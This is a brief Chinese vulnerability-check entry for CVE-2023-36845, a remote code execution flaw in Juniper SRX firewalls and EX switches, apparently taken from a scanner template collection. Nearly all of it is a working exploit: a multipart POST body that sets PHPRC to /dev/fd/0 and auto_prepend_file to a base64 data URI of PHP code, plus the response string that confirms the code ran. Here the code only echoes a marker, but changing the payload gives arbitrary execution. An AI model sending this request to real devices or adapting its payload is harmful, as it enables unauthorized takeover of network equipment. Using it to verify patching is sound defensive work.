# JuniperSRX防火墙和EX交换机远程代码执行漏洞

JuniperSRX ｜ 命令执行 ｜ —
- **请求**：`POST / HTTP/1.1`

**Payload**
```
--------------------------d243ab87a113ee7a
Content-Disposition: form-data; name="allow_url_include"
1
--------------------------d243ab87a113ee7a
Content-Disposition: form-data; name="auto_prepend_file"
"data://text/plain;base64,PD8gZWNobyAnQ1ZFLTIwMjMtMzY4NDUnOyA/Pg=="
--------------------------d243ab87a113ee7a
Content-Disposition: form-data; name="PHPRC"
/dev/fd/0
--------------------------d243ab87a113ee7a--
```
- **响应特征**：200 CVE-2023-36845